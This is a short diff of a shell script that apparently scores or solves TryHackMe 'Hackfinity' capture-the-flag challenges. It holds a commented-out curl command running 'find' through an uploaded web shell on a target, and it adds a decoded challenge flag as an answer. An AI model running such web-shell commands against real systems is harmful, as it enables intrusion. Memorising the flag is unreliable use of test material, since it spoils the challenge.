@@ -58,8 +58,7 @@ echo "6 - DARK ENCRYPTOR 2"
 #curl -s -X GET http:/$target_ip/uploads/$SHELL?cmd=find+/+-type+f+-name+"flag.txt" -o $result_folder/path.txt
 
 echo "7 - ORDER"
-# First key is  01010011 01001110 01000101 01000001 01001011 01011001 (SNEAKY), leading to ORDER: Attack at dawn. Target: 
-# Second key is 01010101 01011111 01001000 01110101 01111111 00000001
-
+# Key is  01010011 01001110 01000101 01000001 01001011 01011001 (SNEAKY), leading to ORDER: Attack at dawn. Target: THM{the_hackfinity_highschool}.
+points=$((points + 30))
 
 echo "Current score : $points"
